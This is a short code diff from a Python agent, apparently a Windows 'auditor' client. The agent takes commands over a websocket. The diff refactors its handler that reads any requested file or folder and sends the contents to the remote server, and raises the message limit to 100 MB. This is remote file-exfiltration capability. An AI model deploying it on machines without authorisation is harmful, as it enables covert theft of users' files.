@@ -295,17 +295,8 @@ async def listen_for_remote_commands(websocket):
 
                     elif command_type == 'file_download':
                         filepath = data.get('payload', '')
-                        try:
-                            with open(filepath, 'rb') as f:
-                                file_data = f.read()
-                            b64_data = base64.b64encode(file_data).decode('utf-8')
-                            response_data["result"] = {
-                                "success": True,
-                                "filename": os.path.basename(filepath),
-                                "content": b64_data
-                            }
-                        except Exception as e:
-                            response_data["result"] = {"success": False, "error": str(e)}
+                        result = WindowsAuditor._RemoteControl.download_file_or_folder(filepath)
+                        response_data["result"] = result
                         await websocket.send(json.dumps(response_data))
 
                     elif command_type == 'file_upload':
@@ -525,7 +516,7 @@ async def connect():
     while True:
         try:
             print(f"Attempting to connect to {uri}...")
-            async with websockets.connect(uri) as websocket:
+            async with websockets.connect(uri, max_size=100 * 1024 * 1024) as websocket:
                 print(f"Connection successful!")
 
                 # Bắt đầu các tác vụ chạy song song:
